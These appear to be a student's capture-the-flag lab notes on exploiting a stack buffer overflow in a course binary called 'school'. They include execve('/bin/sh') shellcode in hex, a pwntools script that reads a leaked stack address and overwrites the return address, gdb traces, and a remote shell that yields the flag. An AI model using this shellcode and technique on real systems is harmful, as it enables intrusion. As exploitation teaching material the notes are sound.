Using the code from [[Backdoor]] to create shellcode for [[School]]

So, what I really want to learn from here is what is the BARE MINIMUM shellcode I need for [[School]]
I think this is the important part, starting with where we jumped to
```
        004006bb bb d2 07        MOV        EBX,s_/bin/sh_004007d2       = "/bin/sh"
                 40 00
                             LAB_004006c0    XREF[1]:     004006b9(j)  
        004006c0 48 89 df        MOV        RDI=>s_/bin/sh_004007d2,RBX  = "/bin/date"
												                        = "/bin/sh"
        004006c3 b8 00 00        MOV        EAX,0x0
                 00 00
        004006c8 e8 83 fe        CALL       <EXTERNAL>::system   int system(char * __command)
                 ff ff
```

Hmm, is it a problem that system isn't included in the code though?

Here it is in gdb
```
   0x000000000040069d <+0>:     push   rbp
   0x000000000040069e <+1>:     mov    rbp,rsp
   0x00000000004006a1 <+4>:     push   rbx
   0x00000000004006a2 <+5>:     sub    rsp,0x18
   0x00000000004006a6 <+9>:     mov    ebx,0x4007c8
   0x00000000004006ab <+14>:    mov    DWORD PTR [rbp-0x14],0xdead
   0x00000000004006b2 <+21>:    cmp    DWORD PTR [rbp-0x14],0x1337
   0x00000000004006b9 <+28>:    jne    0x4006c0 <get_time+35>
   0x00000000004006bb <+30>:    mov    ebx,0x4007d2
   0x00000000004006c0 <+35>:    mov    rdi,rbx
   0x00000000004006c3 <+38>:    mov    eax,0x0
   0x00000000004006c8 <+43>:    call   0x400550 <system@plt>
   0x00000000004006cd <+48>:    add    rsp,0x18
   0x00000000004006d1 <+52>:    pop    rbx
   0x00000000004006d2 <+53>:    pop    rbp
   0x00000000004006d3 <+54>:    ret
```

I feel like this might be all we need:
It starts at `0x004006bb`
```
mov    ebx,0x4007d2
mov    rdi,rbx
mov    eax,0x0
call   0x400550 <system@plt>
```
Hmmm, the problem is, there is no address for `system` in school ...
	but it looks like the `system` assembly is short...
```
Dump of assembler code for function system@plt:
   0x0000000000400550 <+0>:     jmp    QWORD PTR [rip+0x200aca]        # 0x601020 <system@got.plt>
   0x0000000000400556 <+6>:     push   0x1
   0x000000000040055b <+11>:    jmp    0x400530
```


There's this from Exploit DB](https://www.exploit-db.com/exploits/46907), but that feels like cheating
```
0:  48 31 f6                xor    rsi,rsi  
3:  56                      push   rsi  
4:  48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f2f6e69622f  
b:  2f 73 68  
e:  57                      push   rdi  
f:  54                      push   rsp  
10: 5f                      pop    rdi  
11: 6a 3b                   push   0x3b  
13: 58                      pop    rax  
14: 99                      cdq  
15: 0f 05                   syscall
```



We gonna see if that worked
Assembly:
```
xor rsi,rsi
push rsi
mov rdi,0x68732f2f6e69622f
push rdi
push rsp
pop rdi
push 0x3b
pop rax
cdq
syscall
```
Hex:
```
4831F65648BF2F62696E2F2F736857545F6A3B58990F05
\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\x6A\x3B\x58\x99\x0F\x05
```
Used [Defusee Online x86 Assembler](https://defuse.ca/online-x86-assembler.htm#disassembly)

Did this fucking do it?!?!?!?!?

```python
def smallPld():
	code = b'\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\x6A\x3B\x58\x99\x0F\x05'
	p = 40 - len(code)
	pad = b'A'*p
	addr = p64(0x7fffffffddb0)
	return code + pad + addr
	

def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./school -q')
	p.sendline("break *0x7fffffffddb0")
	#p = process('./school')
	p.sendline("r")
	p.recvuntil("directions:")
	p.sendline(smallPld())
	p.interactive()
```
###### Results:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 School_Pwn1.py
[*] Switching to interactive mode
Hi, H1\xf6VH\xbf/bin//shWT_j;X\x99\x0f\x05AAAAAAAAAAAAAAAAA\xb0\xdd\xff\xff\xff\x7f
process 1491543 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
$ pwd
/home/kali/Desktop/5-Week
$ whoami
[Detaching after vfork from child process 1491902]
kali
```

Hmmm, it seems like this didn't work remotely
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 School_Pwn1.py
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1338: Done
/home/kali/Desktop/5-Week/School_Pwn1.py:83: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("directions:")
[*] Switching to interactive mode

Hi, H1\xf6VH\xbf/bin//shWT_j;X\x99\x0f\x05AAAAAAAAAAAAAAAAA\xb0\xdd\xff\xff\xff\x7f
[*] Got EOF while reading in interactive
$ ls
$  zsh: suspended (signal)  python3 School_Pwn1.py

```

Okay yeah, I am getting  a segfault: (this is local)
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 School_Pwn1.py
[+] Starting local process './school': pid 1496358
/home/kali/Desktop/5-Week/School_Pwn1.py:79: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("directions:")
[*] Switching to interactive mode

Hi, H1\xf6VH\xbf/bin//shWT_j;X\x99\x0f\x05AAAAAAAAAAAAAAAAA\xb0\xdd\xff\xff\xff\x7f
[*] Got EOF while reading in interactive
$ ls
[*] Process './school' stopped with exit code -11 (SIGSEGV) (pid 1496358)
[*] Got EOF while sending in interactive
```

Getting a fault at my secret address:
```
└─$ python3 School_Pwn1.py
[+] Starting local process './school': pid 1496959
/home/kali/Desktop/5-Week/School_Pwn1.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("directions:")
[*] Process './school' stopped with exit code -11 (SIGSEGV) (pid 1496959)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/5-Week/core.1496959'
    Arch:      amd64-64-little
    RIP:       0x7fffffffddb0
    RSP:       0x7ffc9d5881a0
    Exe:       '/home/kali/Desktop/5-Week/school' (0x400000)
    Fault:     0x7fffffffddb0
[*] rsp = 0x7ffc9d5881a0
[*] rip offset = -1
```


This is a pain in the ass to debug without gdb...which seems to think this payload works


Getting a similar error using the other shellcode:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 School_Pwn1.py
[+] Starting local process './school': pid 1500162
/home/kali/Desktop/5-Week/School_Pwn1.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("directions:")
[*] Process './school' stopped with exit code -11 (SIGSEGV) (pid 1500162)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/5-Week/core.1500162'
    Arch:      amd64-64-little
    RIP:       0x7fffffffddb0
    RSP:       0x7ffe1a94e850
    Exe:       '/home/kali/Desktop/5-Week/school' (0x400000)
    Fault:     0x7fffffffddb0
[*] rsp = 0x7ffe1a94e850
[*] rip offset = -1
```
....which also works with GDB

AURGHHHHHH


Back to my payload:
This is what it looks like right before the call to `return`
###### Assembly:
```
 →   0x400681 <main+80>        ret    
   ↳  0x7fffffffddb0                  xor    rsi, rsi
      0x7fffffffddb3                  push   rsi
      0x7fffffffddb4                  movabs rdi, 0x68732f2f6e69622f
      0x7fffffffddbe                  push   rdi
      0x7fffffffddbf                  push   rsp
      0x7fffffffddc0                  pop    rdi
```
###### Stack
```
0x00007fffffffddd8│+0x0000: 0x00007fffffffddb0  →  0x622fbf4856f63148     ← $rsp
0x00007fffffffdde0│+0x0008: 0x0000000000000000
0x00007fffffffdde8│+0x0010: 0x0000000000400631  →  <main+0> push rbp
0x00007fffffffddf0│+0x0018: 0x0000000100000000
0x00007fffffffddf8│+0x0020: 0x00007fffffffdee8  →  0x00007fffffffe251  →  "/home/kali/Desktop/5-Week/school"
0x00007fffffffde00│+0x0028: 0x00007fffffffdee8  →  0x00007fffffffe251  →  "/home/kali/Desktop/5-Week/school"
0x00007fffffffde08│+0x0030: 0x08b00284bd33bf9c
0x00007fffffffde10│+0x0038: 0x0000000000000000
```
###### Register:
```
$rax   : 0x0               
$rbx   : 0x00007fffffffdee8  →  0x00007fffffffe251  →  "/home/kali/Desktop/5-Week/school"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffddd8  →  0x00007fffffffddb0  →  0x622fbf4856f63148
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007fffffffdc00  →  0x56f63148202c6948
$rdi   : 0x00007fffffffdbd0  →  0x00007fffffffdc00  →  0x56f63148202c6948
$rip   : 0x0000000000400681  →  <main+80> ret 
$r8    : 0x73              
$r9    : 0x1               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdef8  →  0x00007fffffffe272  →  "SHELL=/usr/bin/zsh"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
```

I wonder if it's just sliding straight into the A's afterwards
Because it seems like the code is all there...

Like it crashes because rbp is fucked up or something

# New Day New Results
So NOW, when I run with gdb, my stack is filled with 0's
I swear I changed NOTHING
```python
def smallPld():
	code = b'\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\x6A\x3B\x58\x99\x0F\x05'
	p = 40 - len(code)
	pad = b'A'*p
	addr = p64(0x7fffffffddb0)
	return code + pad + addr

def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./school -q')
	p.sendline("break *0x0000000000400681")
	#p = process('./school')
	p.sendline("r")
	p.recvuntil("directions:")
	p.sendline(smallPld())
	# p.sendline(whyPLD())
	p.interactive()
```
Right before the `ret`:
```
     0x400676 <main+69>        call   0x4004d0 <printf@plt>
     0x40067b <main+74>        mov    eax, 0x0
     0x400680 <main+79>        leave  
 →   0x400681 <main+80>        ret    
   ↳  0x7fffffffddb0                  add    BYTE PTR [rax], al
      0x7fffffffddb2                  add    BYTE PTR [rax], al
      0x7fffffffddb4                  add    BYTE PTR [rax], al
      0x7fffffffddb6                  add    BYTE PTR [rax], al
      0x7fffffffddb8                  add    BYTE PTR [rax], al
      0x7fffffffddba                  add    BYTE PTR [rax], al
gef➤  $ x 0x7fffffffddb0
0x7fffffffddb0:    0x00000000
```
After continuing:
```
gef➤  $ c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffddb0 in ?? ()
```

So....wtf

Trying to fix the stack
Adding this assembly:
```
mov rbp,0x7fffffffddb0
mov rsp,rbp
sub rsp,0x60

"\x48\xBD\xB0\xDD\xFF\xFF\xFF\x7F\x00\x00\x48\x89\xEC\x48\x83\xEC\x60"
```
This should set rbp and rsp to reasonable values

With this before my code, it is EXACTALLY 40 bytes

This did not work lol

Wait...is the address the same every time?

OH FUCK ME
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ./school
Let's go to school! School's at: 0x7ffc0b2e9e60. gimme directions:
^Z
zsh: suspended  ./school

┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ./school
Let's go to school! School's at: 0x7ffee7302000. gimme directions:
^Z
zsh: suspended  ./school

┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ./school
Let's go to school! School's at: 0x7ffe37d6b640. gimme directions:
^Z
zsh: suspended  ./school

```
She changes...

Setting us up to run properly:
```python
def anotherFuckingPld(a):
	code = b'\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\x6A\x3B\x58\x99\x0F\x05'
	p = 40 - len(code)
	pad = b'A'*p
	addr = p64(int(a, 16))
	#addr = p64(ad)
	return code + pad + addr

def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./school -q')
	p.sendline("break *0x0000000000400681")
	#p = process('./school')
	p.sendline("r")
	#p.interactive()
	p.recvuntil("at: ")
	a = cleanLine(p.recvuntil("."))
	#print(a)
	ad =  re.split("\.", a)
	addr = ad[0]
	#print(addr)
	p.recvuntil("directions:")
	#p.sendline(cyclic(100))
	#p.sendline(cyclic(40) + p64(0x7fffffffddb0) + cyclic(10))
	#p.sendline(smallPld())
	#p.sendline(newPld())
	p.sendline(anotherFuckingPld(addr))
	p.interactive()

```

And it looks like she works!
###### At Breakpoint!
```
 →   0x400681 <main+80>        ret    
   ↳  0x7fffffffddf0                  xor    rsi, rsi
      0x7fffffffddf3                  push   rsi
      0x7fffffffddf4                  movabs rdi, 0x68732f2f6e69622f
      0x7fffffffddfe                  push   rdi
      0x7fffffffddff                  push   rsp
      0x7fffffffde00                  pop    rdi
```
It's beautiful!!!
Continuing:
```
gef➤  $ c
Continuing.
process 36808 is executing new program: /usr/bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x400681
```


Well....does she work in the wild?

I made `getAddr()` it's own function
Yay me
```python
def getAddr(p):
	p.recvuntil("at: ")
	a = cleanLine(p.recvuntil("."))
	#print(a)
	ad =  re.split("\.", a)
	return ad[0]
```


#### It works locally!!!
```python
def localShell():
	p = process('./school')
	addr = getAddr(p)
	p.recvuntil("directions:")
	p.sendline(anotherFuckingPld(addr))
	p.interactive()
```
(I will need to change these function names, I know)
```
──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 School_Pwn1.py
[*] Switching to interactive mode
Hi, H1\xf6VH\xbf/bin//shWT_j;X\x99\x0f\x05AAAAAAAAAAAAAAAAA\xb0\xe5#\xc4\xfc
$ whoami
kali
$ pwd
/home/kali/Desktop/5-Week

```

Can we get a remote?!?!?!
## It's beautiful:
```python
def remoteShell():
	p = remote(HOST, PORT)
	addr = getAddr(p)
	p.recvuntil("directions:")
	p.sendline(anotherFuckingPld(addr))
	p.interactive()
```
QED
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 School_Pwn1.py
[*] Switching to interactive mode
Hi, H1\xf6VH\xbf/bin//shWT_j;X\x99\x0f\x05AAAAAAAAAAAAAAAAA`\x8c\xc2\xf5\xff\x7f
$ whoami
pwn
$ ls
flag.txt
school
$ cat flag.txt
flag{first_day_of_pwn_school}
```

# More Shellcode from Pwntools Docs:
**Raw Hex** (zero bytes in bold):
```
6A68682F2F2F73682F62696E89E331C96A0B5899CD80 
```

**String Literal:**
```
"\x6A\x68\x68\x2F\x2F\x2F\x73\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x6A\x0B\x58\x99\xCD\x80"
```

**Array Literal:**
```
{ 0x6A, 0x68, 0x68, 0x2F, 0x2F, 0x2F, 0x73, 0x68, 0x2F, 0x62, 0x69, 0x6E, 0x89, 0xE3, 0x31, 0xC9, 0x6A, 0x0B, 0x58, 0x99, 0xCD, 0x80 }
```

Disassembly:
```

0:  6a 68                   push   0x68  
2:  68 2f 2f 2f 73          push   0x732f2f2f  
7:  68 2f 62 69 6e          push   0x6e69622f  
c:  89 e3                   mov    ebx,esp  
e:  31 c9                   xor    ecx,ecx  
10: 6a 0b                   push   0xb  
12: 58                      pop    rax  
13: 99                      cdq  
14: cd 80                   int    0x80
```


For writeup
Right before shellcode is called:
```
 →   0x400681 <main+80>        ret    
   ↳  0x7fffffffddd0                  xor    rsi, rsi
      0x7fffffffddd3                  push   rsi
      0x7fffffffddd4                  movabs rdi, 0x68732f2f6e69622f
      0x7fffffffddde                  push   rdi
      0x7fffffffdddf                  push   rsp
      0x7fffffffdde0                  pop    rdi
```

```
gef➤  $ x/10i 0x7fffffffddd0
   0x7fffffffddd0:    xor    rsi,rsi
   0x7fffffffddd3:    push   rsi
   0x7fffffffddd4:    movabs rdi,0x68732f2f6e69622f
   0x7fffffffddde:    push   rdi
   0x7fffffffdddf:    push   rsp
   0x7fffffffdde0:    pop    rdi
   0x7fffffffdde1:    push   0x3b
   0x7fffffffdde3:    pop    rax
   0x7fffffffdde4:    cdq
   0x7fffffffdde5:    syscall
```
Breakpoint:
```
   0x7fffffffddd0:                 xor    rsi,rsi
   0x7fffffffddd3                  push   rsi
   0x7fffffffddd4                  movabs rdi, 0x68732f2f6e69622f
   0x7fffffffddde                  push   rdi
●→ 0x7fffffffdddf                  push   rsp
   0x7fffffffdde0                  pop    rdi
   0x7fffffffdde1                  push   0x3b
   0x7fffffffdde3                  pop    rax
   0x7fffffffdde4                  cdq    
   0x7fffffffdde5                  syscall 
```

Stack and rsp
```
$rsp   : 0x00007fffffffddf0  →  "/bin//sh"
$rsi   : 0x0               
$rdi   : 0x68732f2f6e69622f ("/bin//sh"?)

stack ────
0x00007fffffffddf0│+0x0000: "/bin//sh"     ← $rsp
```


Next breakpoint:
```
   0x7fffffffddd0:                 xor    rsi,rsi
   0x7fffffffddd3                  push   rsi
   0x7fffffffddd4                  movabs rdi, 0x68732f2f6e69622f
   0x7fffffffddde                  push   rdi
   0x7fffffffdddf                  push   rsp
   0x7fffffffdde0                  pop    rdi
●→ 0x7fffffffdde1                  push   0x3b
   0x7fffffffdde3                  pop    rax
   0x7fffffffdde4                  cdq    
   0x7fffffffdde5                  syscall 
```
Regisers
```
 registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffdf08  →  0x00007fffffffe272  →  "/home/kali/Desktop/5-Week/school"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffddf0  →  "/bin//sh"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x0               
$rdi   : 0x00007fffffffddf0  →  "/bin//sh"
$rip   : 0x00007fffffffdde1  →  0xf041050f99583b6a

stack ────
0x00007fffffffddf0│+0x0000: "/bin//sh"     ← $rsp, $rdi

```

Next breakpoint:
```
   0x7fffffffddd0:                 xor    rsi,rsi
   0x7fffffffddd3                  push   rsi
   0x7fffffffddd4                  movabs rdi, 0x68732f2f6e69622f
   0x7fffffffddde                  push   rdi
   0x7fffffffdddf                  push   rsp
   0x7fffffffdde0                  pop    rdi
   0x7fffffffdde1                  push   0x3b
   0x7fffffffdde3                  pop    rax
●→ 0x7fffffffdde4                  cdq    
   0x7fffffffdde5                  syscall 
```
We have something in `rax` now
```
registers ────
$rax   : 0x3b              
$rbx   : 0x00007fffffffdf08  →  0x00007fffffffe272  →  "/home/kali/Desktop/5-Week/school"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffddf0  →  "/bin//sh"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x0               
$rdi   : 0x00007fffffffddf0  →  "/bin//sh"
$rip   : 0x00007fffffffdde4  →  0x0000003b41050f99

```
Stack is the same


Right before the syscall:
```
 registers ────
$rax   : 0x3b              
$rbx   : 0x00007fffffffdf08  →  0x00007fffffffe272  →  "/home/kali/Desktop/5-Week/school"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffddf0  →  "/bin//sh"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x0               
$rdi   : 0x00007fffffffddf0  →  "/bin//sh"

```

```
0x00007fffffffddf0│+0x0000: "/bin//sh"     ← $rsp, $rdi
```

